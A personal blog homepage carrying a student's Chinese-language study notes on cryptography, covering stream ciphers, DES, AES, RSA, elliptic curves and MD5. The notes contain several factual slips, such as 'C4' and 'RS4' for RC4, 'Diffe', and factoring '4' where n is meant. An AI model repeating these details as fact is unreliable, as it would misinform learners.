<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="mask-icon" href="https://raw.githubusercontent.com/moyuan10086/photo/main/blackground.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"moyuan10086.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="prograing or coffee">
<meta property="og:type" content="website">
<meta property="og:title" content="Moyuan&quot;s website">
<meta property="og:url" content="https://moyuan10086.github.io/index.html">
<meta property="og:site_name" content="Moyuan&quot;s website">
<meta property="og:description" content="prograing or coffee">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="moyuan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://moyuan10086.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Moyuan"s website</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Moyuan"s website</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome to my website</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">moyuan</p>
  <div class="site-description" itemprop="description">prograing or coffee</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/moyuan10086" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;moyuan10086" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2572045628@qq.com" title="E-Mail → mailto:2572045628@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com&#x2F;" rel="noopener" target="_blank">GitHub</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-title-link" itemprop="url">密码学</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-07-20 00:38:47" itemprop="dateCreated datePublished" datetime="2024-07-20T00:38:47+08:00">2024-07-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-08-29 01:31:53" itemprop="dateModified" datetime="2024-08-29T01:31:53+08:00">2024-08-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="密码学概述"><a href="#密码学概述" class="headerlink" title="密码学概述"></a>密码学概述</h3><h4 id="第1章：密码学概述"><a href="#第1章：密码学概述" class="headerlink" title="第1章：密码学概述"></a>第1章：密码学概述</h4><h5 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h5><p><strong>密码学的基本概念</strong></p>
<ul>
<li>密码学：研究在有敌手的情况下如何隐密地传递信息的科学，常被认为是数学和计算机科学的分支。</li>
<li>密码编码学：对消息进行变换，以保证消息在信道传输过程中不被窃取、篡改和利用。</li>
<li>密码分析学：破译和分析密码体制。</li>
</ul>
<p><strong>基本概念</strong></p>
<ul>
<li>明文（m）：要变换的消息</li>
<li>密文（c）：变换后的消息</li>
<li>密钥（k）：秘密参数</li>
<li>加密（E）：将明文变换成密文的过程</li>
<li>解密（D）：由密文恢复出明文的过程</li>
</ul>
<p><strong>密码体制分类</strong></p>
<ul>
<li>按密钥数量：<ul>
<li>对称密码体制：加密密钥和解密密钥相同或可相互推导。</li>
<li>非对称密码体制：加密密钥和解密密钥不同，且难以从一个密钥推导出另一个密钥。</li>
</ul>
</li>
<li>按加密方式：<ul>
<li>流密码：按位加密明文。</li>
<li>分组密码：将明文分成定长的块进行加密。</li>
</ul>
</li>
</ul>
<h5 id="密码体制分析"><a href="#密码体制分析" class="headerlink" title="密码体制分析"></a>密码体制分析</h5><p><strong>安全性要求</strong></p>
<ul>
<li>机密性（Confidentiality）：保证信息仅供授权者使用。</li>
<li>完整性（Integrity）：信息在传输或存储过程中不能被破坏。</li>
<li>认证性（Authentication）：保证消息来源和通信实体的真实性。</li>
<li>不可否认性（Non-repudiation）：防止通信方对行为的否认。</li>
</ul>
<p><strong>密码体制的攻击方法</strong></p>
<ul>
<li>唯密文攻击（Ciphertext Only Attack）：仅知道密文，通过穷举密钥尝试破译。</li>
<li>已知明文攻击（Known Plaintext Attack）：知道一些明文和相应的密文，通过已知明文格式推导密钥。</li>
<li>选择明文攻击（Chosen Plaintext Attack）：选择一些明文并得到相应的密文，确定密钥结构。</li>
<li>选择密文攻击（Chosen Ciphertext Attack）：选择一些密文并得到相应的明文，确定密钥信息。</li>
<li>选择文本攻击（Chosen Text Attack）：选择明文和密文的结合攻击。</li>
</ul>
<p><strong>安全模型</strong></p>
<ul>
<li>无条件安全性（Unconditional Security）：即使具有无限计算资源的敌手也无法破译。</li>
<li>计算安全性（Computational Security）：破译所需的计算代价超出敌手的计算资源。</li>
<li>可证明安全性（Provable Security）：安全性可以规约到难解的数学问题。</li>
</ul>
<h5 id="密码学发展史"><a href="#密码学发展史" class="headerlink" title="密码学发展史"></a>密码学发展史</h5><p><strong>古典密码学</strong></p>
<ul>
<li>古代密码：存在于石刻、壁画、史书、诗词等。</li>
<li>手工密码：代换密码（如凯撒密码、维吉尼亚密码）、置换密码。</li>
<li>机械密码：杰弗逊圆盘、维特斯通圆盘。</li>
<li>电子-机械密码：恩尼格码密码机、九七式欧文印字机。</li>
</ul>
<p><strong>现代密码学</strong>（标志性事件：RSA发明）</p>
<ul>
<li>1949年，Shannon发表《保密系统的通信理论》，为密码系统建立了理论基础。</li>
<li>1976年，美国数据加密标准（DES）的公布，推动了密码学的研究。</li>
<li>1976年，Diffe和Hellman发表《密码学的新方向》，提出了公钥密码学。</li>
<li>1978年，Rivest、Shamir和Adleman提出了第一个实用的公钥密码体制RSA，推动了公钥密码的研究。</li>
</ul>
<p><strong>密码学基础</strong></p>
<ul>
<li>1.2.3 密码体制分类</li>
</ul>
<p><strong>密码体制分析</strong></p>
<ul>
<li>1.3.1 攻击密码系统的方法 安全性要求</li>
<li>1.3.2 安全模型</li>
</ul>
<p><strong>密码学发展史</strong></p>
<ul>
<li>传统密码学</li>
<li>现代密码学</li>
</ul>
<h4 id="第2章：序列密码"><a href="#第2章：序列密码" class="headerlink" title="第2章：序列密码"></a>第2章：序列密码</h4><h5 id="伪随机序列的发展"><a href="#伪随机序列的发展" class="headerlink" title="伪随机序列的发展"></a>伪随机序列的发展</h5><p><strong>伪随机数的算法与应用</strong></p>
<ul>
<li>随机序列：被称为随机数，目前没有统一的数学定义，主要从统计学的角度阐述，应该是独立的、互不相关的、具有长周期、均匀分布、不可压缩等。</li>
<li>真随机数：由某些物理过程产生，如热噪声、宇宙噪声、放射性衰变等，完全不可预测，在任何情况下不可能重复产生两个完全相同的随机数。</li>
<li>伪随机数：由数学公式产生，若生成随机数的算法确定，随机数也确定。伪随机序列就是具有某种随机特性的确定序列，能通过一系列测试检验的伪随机数可作为真随机数使用。</li>
<li>伪随机数在数据加密、密钥产生、密钥管理、数字签名等方面扮演核心角色。</li>
</ul>
<p><strong>伪随机序列的定义与性质</strong></p>
<ul>
<li>定义：如果一个序列可以随意产生和重复进行，且具有近似随机的统计特性，就称为伪随机序列。</li>
<li>常用的伪随机序列有：m序列、Gold序列、Walsh序列、R-S序列等。周期达到最大值的序列称为m序列。</li>
<li>性质：<ul>
<li>均衡特性：m序列在一个周期中1与0出现的次数基本相等，1的个数比0多1个。</li>
<li>游程分布随机性：m序列在一个周期中长度为i的游程数占总游程数的1/2i，且在等长的游程中“0”、“1”游程各占半。</li>
<li>移位相加特性：一个周期为T的m序列mT与任意次位移序列mr模二相加后所得序列仍是mT序列某次移位后的序列。</li>
<li>自相关性：周期序列的自相关函数表示序列与其移位后的序列在一个周期内对应位相同和相异的位数之差的一个参数。</li>
</ul>
</li>
</ul>
<p><strong>伪随机数产生器</strong></p>
<ul>
<li>产生伪随机数序列的算法称为伪随机数产生器，是一个确定算法，将短的随机比特序列（种子）扩展为长得多的、近似随机的比特序列。</li>
<li>方法：<ul>
<li>平方取中法：选取2s位整数作为种子，将其平方得到4s位整数，取中间2s位作为下一个种子，生成随机数。</li>
<li>线性同余法：常用方法，采用均匀分布思想，递推公式为：$ x_{i+1} = (ax_i + c) \mod m $，其中a、c和m为常数。</li>
<li>BBS产生器：基于大整数因子分解，选择两个大素数p和q，满足$ p ≡ q ≡ 3 \mod 4 $，令$n = pq$，随机选择整数s，计算$ x_0 = s^2 \mod n $。</li>
</ul>
</li>
</ul>
<h5 id="常用的序列密码算法"><a href="#常用的序列密码算法" class="headerlink" title="常用的序列密码算法"></a>常用的序列密码算法</h5><p><strong>A5 序列密码算法</strong></p>
<ul>
<li>基于线性反馈移位寄存器（LFSR）的流密码算法。</li>
<li>构造：由3个LFSR组成，分别包含19、22和23比特，密钥（种子密钥）为64位。</li>
<li>工作机制：利用3个LFSR进行钟控方法，每个时间单元将R1[18]、R2[21]和R3[22]进行异或并作为输出密钥流。</li>
</ul>
<p><strong>C4 序列密码算法</strong></p>
<ul>
<li><strong>开发者</strong>：麻省理工学院的Rivest，也是RS4的开发者之一。</li>
<li><strong>特点</strong>：易于在软件中实现，是世界上使用最广泛的序列密码之一。</li>
<li><strong>应用</strong>：广泛用于Microsoft Windows、Lotus Notes等软件，以及SSL和无线系统安全。</li>
</ul>
<p><strong>ZUC 序列密码算法</strong></p>
<ul>
<li>由中国科学院数据保护和通信安全研究中心研制，是加密算法128-EEA3和完整性算法128-EIA3的核心。</li>
<li>构造：由LFSR、比特重组（BR）和非线性函数F组成。</li>
<li>线性反馈移位寄存器：包括16个31比特寄存器单元，定义在素数域上，有初始化状态和工作状态。</li>
<li>比特重组：从LFSR的8个寄存器单元抽取128比特组成4个32比特的字供下层非线性函数F和密钥输出使用。</li>
<li>非线性函数F：包含2个32比特记忆单元变量R1和R2，输入为3个32比特字X0、X1、X2，输出为32比特字W。</li>
<li>密钥封装：将初始密钥k、初始向量iv和常量串d作为LFSR的初始状态。</li>
</ul>
<h5 id="序列密码的设计与分析"><a href="#序列密码的设计与分析" class="headerlink" title="序列密码的设计与分析"></a>序列密码的设计与分析</h5><p><strong>线性反馈移位寄存器（LFSR）</strong></p>
<ul>
<li>基本概念：LFSR是一种用于生成伪随机序列的硬件电路，通过线性反馈函数生成密钥流。</li>
<li>工作原理：初始状态由用户确定，当时钟脉冲来临时，将寄存器内容移位，并通过反馈函数计算新的状态。</li>
<li>线性反馈：如果反馈函数是线性函数，则称为线性反馈移位寄存器。反馈函数形式为：$ f(a<em>1, a_2, …, a_n) = a_n \oplus a</em>{n-1} \oplus … \oplus a_1 $（模2加法）。</li>
</ul>
<p><strong>已知明文攻击</strong></p>
<ul>
<li>利用LFSR的线性性，基于已知明文攻击可以较容易破译流密码算法。</li>
<li>攻击步骤：<ol>
<li>由明文和密文序列得到密钥序列。</li>
<li>根据密钥序列求解线性反馈寄存器的反馈函数。</li>
</ol>
</li>
</ul>
<h4 id="第3章：分组密码"><a href="#第3章：分组密码" class="headerlink" title="第3章：分组密码"></a>第3章：分组密码</h4><h5 id="分组密码的设计原则"><a href="#分组密码的设计原则" class="headerlink" title="分组密码的设计原则"></a>分组密码的设计原则</h5><p><strong>基本原理</strong></p>
<ul>
<li>分组密码将消息进行等长分组（如每组消息长度为n比特），然后用同一个密钥对每个分组进行加密。分组密码与流密码都属于对称密码体制，但它们有很大差异：分组密码每次加密一个消息块，而流密码是逐比特加密。</li>
</ul>
<p><strong>设计原则</strong></p>
<ul>
<li><strong>混淆</strong>：使密钥和密文之间的依赖关系尽可能模糊。</li>
<li><strong>扩散</strong>：为了隐藏明文的统计特性，将一位明文的影响扩散到多位密文中。</li>
<li><strong>乘积密码</strong>：将若干加密操作串联起来，对数据进行重复迭代操作。大多数分组密码都是乘积密码，由轮迭代组合而成。</li>
</ul>
<p><strong>结构</strong></p>
<ul>
<li><strong>迭代结构</strong><ul>
<li>Feistel网络：将明文平均分为左半部分L0和右半部分R0，经过多轮迭代完成整个操作过程。</li>
<li>SP（substitution-permutation）网络：包含代替（S盒）和置换（P盒）两部分，典型代表为AES。</li>
</ul>
</li>
</ul>
<h5 id="数据加密标准（DES）"><a href="#数据加密标准（DES）" class="headerlink" title="数据加密标准（DES）"></a>数据加密标准（DES）</h5><p><strong>DES设计思想</strong></p>
<ul>
<li>DES是第一个公开的、完全说明细节的商业级现代算法，被世界公认。它由IBM公司在1971年完成Lucifer密码（64比特分组，128比特密钥）的基础上改进而成。1977年1月15日被批准为联邦标准，并设计推出DES芯片。</li>
</ul>
<p><strong>DES的工作模式</strong></p>
<ul>
<li><strong>初始置换（IP）</strong>：将64位明文的位置按照固定表进行置换，得到乱序的64位明文组。</li>
<li><strong>16轮迭代运算</strong>：每轮运算包含左移、子密钥异或、S盒代替、P盒置换四个步骤。</li>
<li><strong>逆初始置换（IP-1）</strong>：初始置换的逆过程，确保加密和解密可以使用同一个算法。</li>
<li><strong>子密钥生成</strong>：由初始密钥通过PC-1、循环左移位、PC-2三步生成。</li>
</ul>
<p><strong>具体步骤</strong></p>
<ol>
<li>初始置换IP</li>
<li>16轮迭代运算：每轮运算分为左移位、子密钥异或、S盒代替、P盒置换。</li>
<li>逆初始置换IP-1</li>
</ol>
<p><strong>DES的软件实现</strong></p>
<ul>
<li>DES算法可以在软件和硬件中实现，软件实现主要用于数据加密和密钥管理。它的算法过程包括初始置换、16轮迭代运算和逆初始置换三个主要部分。</li>
</ul>
<h5 id="高级数据加密标准（AES）"><a href="#高级数据加密标准（AES）" class="headerlink" title="高级数据加密标准（AES）"></a>高级数据加密标准（AES）</h5><p><strong>背景</strong></p>
<ul>
<li>AES是为了替代DES而提出的，主要由于DES密钥较短，难以抵抗现有的攻击。1997年，美国NIST向全球密码学界发出征集21世纪高级加密标准（AES）算法的公告，并成立了AES标准工作研究室。</li>
</ul>
<p><strong>算法描述</strong></p>
<ul>
<li>明文分组固定：128比特</li>
<li>密钥长度可变：128、192、256比特</li>
<li>算法中间结果称为状态，状态可以用以字节为元素的矩阵阵列表示。</li>
<li>变换步骤：<ul>
<li><strong>字节代替</strong>：利用S盒进行非线性代换。</li>
<li><strong>行移位</strong>：对状态矩阵的各行进行循环左移。</li>
<li><strong>列混合</strong>：将状态矩阵的每一列混淆。</li>
<li><strong>轮密钥加</strong>：状态矩阵与子密钥矩阵的对应字节逐比特异或。</li>
</ul>
</li>
<li><strong>子密钥生成</strong>：从初始密钥生成子密钥的过程，使用扩展密钥算法。</li>
</ul>
<h4 id="第4章：公钥密码"><a href="#第4章：公钥密码" class="headerlink" title="第4章：公钥密码"></a>第4章：公钥密码</h4><h5 id="公钥密码的基本原理"><a href="#公钥密码的基本原理" class="headerlink" title="公钥密码的基本原理"></a>公钥密码的基本原理</h5><p><strong>公钥密码的基本概念</strong></p>
<ul>
<li><strong>历史背景</strong><ul>
<li>1976年，Diffie和Hellman在“密码学的新方向”一文中首次提出了公钥密码体制的思想。</li>
</ul>
</li>
</ul>
<p><strong>公钥密码的基本概念</strong></p>
<ul>
<li>公钥密码体制与对称密码体制完全不同，使用数学函数而不是代替和置换。</li>
<li>公钥密码算法是非对称的，使用两个独立的密钥：公钥和私钥。</li>
<li>公钥密码体制在消息的机密性、密钥分配和认证方面具有重要意义。</li>
</ul>
<p><strong>优势</strong></p>
<ul>
<li><strong>密钥分配</strong>：公钥可以通过公开信道传输，而对称密码体制需要通过安全的秘密通道共享密钥，代价较大。</li>
<li><strong>密钥管理</strong>：在N个用户的系统中，每个用户只需安全保管自己的私钥和N-1个其他用户的公钥，整个系统仅需维护N个公钥；而对称密码体制中，每个用户需使用n-1个密钥，总密钥数量为n(n-1)/2。</li>
<li><strong>数字签名</strong>：提供类似书面手写签名的方法，确保数字签名出自某特定人，并且各方对此无异议。对称密码体制中难以解决陌生人之间的身份认证问题。</li>
</ul>
<p><strong>原理</strong></p>
<ul>
<li>公钥密码体制在加密和解密时使用不同的密钥：公钥用于加密，私钥用于解密。公钥是公开信息，不需要保密，私钥需保密。</li>
<li>给定公钥，要计算出私钥在计算上是不可行的。</li>
<li>这样的通信无需双方预先交换密钥就可以建立保密通信。</li>
</ul>
<p><strong>公钥密码体制的模型</strong></p>
<ul>
<li><strong>加密模型</strong>：接收者B生成一对密钥(pkB, skB)，其中pkB是公钥，skB是私钥。发送者用pkB加密要发送的消息m，接收者用skB解密收到的加密消息c。</li>
<li><strong>认证模型</strong>：A用自己的私钥skA对m加密（实际上为签名），然后发送c给B。B收到c后，利用A的公钥pkA对c解密（实际上为验证），获得对消息来源的认证和数据完整性的保护。</li>
</ul>
<p><strong>安全性要求</strong></p>
<ul>
<li>接收者$B$产生一对密钥在计算上是容易的。</li>
<li>发送者$A$产生相应的密文$c=E(pkB, m)$在计算上是容易的。</li>
<li>对密文解密以恢复出明文$m=D(skB, c)$在计算上是容易的。</li>
<li>已知公钥$pkB$，敌手要求解私钥$skB$在计算上是不可行的。</li>
<li>已知公钥$pkB$和密文$c$，敌手要恢复出明文$m$在计算上是不可行的。</li>
</ul>
<p><strong>陷门单向函数</strong></p>
<ul>
<li>陷门单向函数是满足下列条件的可逆函数f：<ol>
<li>对于任意的$x$，计算$y=f(x)$是容易的。</li>
<li>对于任意的$y$，计算x使得$y=f(x)$是困难的。</li>
<li>存在陷门$t$，已知$t$，对于任意的$y$，计算$x$使得$y=f(x)$是容易的。</li>
</ol>
</li>
</ul>
<p><strong>常见的陷门单向函数</strong></p>
<ol>
<li><strong>大整数分解问题</strong>：已知两个大素数$p$和$q$，求$n=pq$是容易的，而由$n$求$p$和$q$则是困难的。</li>
<li><strong>离散对数问题</strong>：给定一个大素数$p$，已知$x$，求$y≡gx \mod p$是容易的，而已知$y$, $g$, $p$，求$x$使得$y≡gx \mod p$成立则是困难的。</li>
<li><strong>多项式求根问题</strong>：有限域$GF(p)$上的一个多项式已知$a<em>0$, $a_1$, $…$, $a</em>{n-1}$ ,$p$和$x$，求$y$是容易的，而已知$y$, $a<em>0$, $a_1$, …, $a</em>{n-1}$，求$x$则是困难的。</li>
<li><strong>决策性$Diffie-Hellman$问题</strong>：给定素数$p$，令$g$是$𝒁𝒑∗$的一个生成元。已知$a=gx$, $b=gy$, $c=gz$，判断等式$z ≡ xy \mod p$是否成立。</li>
<li><strong>二次剩余问题</strong>：给定一个合数$n$和整数$a$，判断$a$是否为$\mod n$的二次剩余。</li>
<li><strong>背包问题</strong>：给定向量$A$和$x$，求和式$S=f(x)$是容易的，而由 $A$ 和 $S$ 求 $x$ 则是困难的。</li>
</ol>
<h5 id="RSA密码"><a href="#RSA密码" class="headerlink" title="RSA密码"></a>RSA密码</h5><p><strong>RSA算法描述</strong></p>
<ul>
<li>RSA由Ron Rivest、Adi Shamir和Leonard Adleman于1978年提出。</li>
</ul>
<p><strong>密钥生成</strong></p>
<ol>
<li>选取两个互异大素数$p$和$q$。</li>
<li>计算 $n=p×q$ 及其欧拉函数值$φ(n)=(p-1)(q-1)$。</li>
<li>选择一个整数$e$，$1 &lt; e&lt;φ(n)$，使得$gcd(φ(n), e)=1$。</li>
<li>计算$e$的逆元$d$，使得$ed≡1 \mod φ(n)$。</li>
<li>公钥为$(e, n)$，私钥为$d$。</li>
</ol>
<p><strong>RSA加密</strong></p>
<ul>
<li>给定明文$m$，$0≤m&lt;n$，计算$c≡me \mod n$。</li>
</ul>
<p><strong>RSA解密</strong></p>
<ul>
<li>对于密文$c$，计算$m≡cd \mod n$。</li>
</ul>
<p><strong>RSA解密的正确性</strong></p>
<ul>
<li>由加密过程知$c≡me \mod n$，又$de≡1 \mod φ(n)$，故$cd \mod n≡med \mod n≡m \cdot 1+rφ(n) \mod n$。</li>
</ul>
<p><strong>RSA的安全性</strong></p>
<ul>
<li><strong>数学攻击</strong>：主要途径包括分解4为两个素因子、直接确定$φ(n)$以及直接确定$d$。对$RSA$的密码分析主要集中于分解$n$为两个素因子。</li>
<li><strong>大素数的素因子分解</strong>：随着计算能力的提高，模数长度为1024bits存在安全缺陷，建议模数长度应大于1024bits。</li>
<li><strong>参数p和q的限制条件</strong>：$p$和$q$的长度应该相差仅几位，$(p-1)$和$(q-1)$应有一个大的素因子，$gcd(p-1, q-1)$应较小。</li>
<li><strong>穷举攻击</strong>：使用大的密钥空间抗穷举攻击，但密钥越大，系统运行速度越慢。</li>
<li><strong>计时攻击</strong>：通过记录计算机解密消息所用的时间来确定私钥。</li>
<li><strong>选择密文攻击</strong>：敌手通过计算得到明文$m$。</li>
</ul>
<h5 id="椭圆曲线密码"><a href="#椭圆曲线密码" class="headerlink" title="椭圆曲线密码"></a>椭圆曲线密码</h5><p><strong>基本概念</strong></p>
<ul>
<li>椭圆曲线的方程是以下形式的三次方程：$y² + axy + by = x³ + cx² + dx + e$，其中a，b，c，d，e是满足某些条件的实数。</li>
</ul>
<p><strong>椭圆曲线密码体制</strong></p>
<ul>
<li><p>椭圆曲线密码体制是基于椭圆曲线离散对数问题（ECDLP）的困难性来设计的。</p>
</li>
<li><p><strong>密钥生成</strong>：在椭圆曲线$Ep(a, b)$上选取一个生成元P，随机选取整数$x$，计算$Q=xP$。公钥为$Q$，私钥为$x$。</p>
</li>
<li><p><strong>加密</strong>：随机选取整数k，计算$C1=kP$,$ C2=Pm+kQ$，密文为$(C1, C2)$。</p>
</li>
<li><p><strong>解密</strong>：计算<br>$C2-xC1=Pm+kQ-xkP=Pm$</p>
</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li>安全性高：相同的密钥长度下，椭圆曲线密码体制比RSA或DSA更安全。</li>
<li>密钥长度小：在实现相同的安全性能条件下，椭圆曲线密码体制所需的密钥长度远小于基于有限域上的离散对数问题或大整数分解问题的公钥密码体制的密钥长度。</li>
<li>算法灵活性好：椭圆曲线具有丰富的群结构和多选择性。</li>
</ul>
<h4 id="第5章：单向散列函数和消息认证"><a href="#第5章：单向散列函数和消息认证" class="headerlink" title="第5章：单向散列函数和消息认证"></a>第5章：单向散列函数和消息认证</h4><h5 id="单向散列函数基础"><a href="#单向散列函数基础" class="headerlink" title="单向散列函数基础"></a>单向散列函数基础</h5><p><strong>Hash函数的定义</strong></p>
<ul>
<li>Hash函数h是一个公开函数，用于将任意长的消息m映射为较短的、固定长度的一个值h(m)，称为消息摘要或哈希值。</li>
</ul>
<p><strong>Hash函数的性质</strong></p>
<ol>
<li><strong>输入任意长</strong>：函数的输入可以是任意长的消息。</li>
<li><strong>输出固定长</strong>：函数的输出是固定长度的摘要。</li>
<li><strong>计算简便</strong>：对任意给定的x，计算$h(x)$比较容易。</li>
<li><strong>单向性</strong>：对任意给定的Hash值z，找到满足$h(x)=z$的$x$在计算上是不可行的。</li>
<li><strong>抗弱碰撞性</strong>：已知x，找到另一个$y(y≠x)$使得$h(y)=h(x)$在计算上是不可行的。</li>
<li><strong>抗强碰撞性</strong>：找到任意两个不同的输入$x, y$，使$h(y)=h(x)$在计算上是不可行的。</li>
</ol>
<p><strong>碰撞性</strong></p>
<ul>
<li>碰撞是指对于两个不同的消息x和y，如果它们的Hash值相同，则发生了碰撞。Hash函数必须具有碰撞抵抗性，确保找到碰撞在计算上是不可行的。</li>
</ul>
<p><strong>Hash与加密的对比</strong></p>
<ul>
<li>加密是双向的，需要使用密钥进行加密和解密。Hash是单向的，没有解Hash的过程。</li>
</ul>
<p><strong>迭代型Hash函数的一般结构</strong></p>
<ul>
<li>Merkle基于压缩函数f提出了一个Hash函数的一般结构。输入m被分为L个分组，每个分组的长度为b比特。如果最后一个分组长度不够，需对其填充。最终输出的链接变量CVL就是Hash值。</li>
</ul>
<h5 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h5><p><strong>MD5算法描述</strong></p>
<ul>
<li>前身是MD4算法，由Ron Rivest于1990年提出。MD5算法采用迭代型哈希函数的一般结构，输入任意长的消息，分组长度为512比特，输出128比特的消息摘要。</li>
</ul>
<p><strong>处理过程</strong></p>
<ol>
<li><strong>填充消息</strong>：对消息填充，使其比特长度模512下为448，填充方式为第1位为1，其后各位皆为0。</li>
<li><strong>填充长度</strong>：用64比特表示消息填充前的长度，以little-endian方式附在后面。</li>
<li><strong>初始化MD缓冲区</strong>：使用128比特长的缓冲区，包含4个32比特长的寄存器(A, B, C, D)。</li>
<li><strong>以512比特的分组为单位处理消息</strong>：每一分组都经一压缩函数处理。每一分组分为4轮处理，每轮16步迭代运算。</li>
<li><strong>输出</strong>：所有分组处理完后，最后一个HMD5的输出即为消息摘要。</li>
</ol>
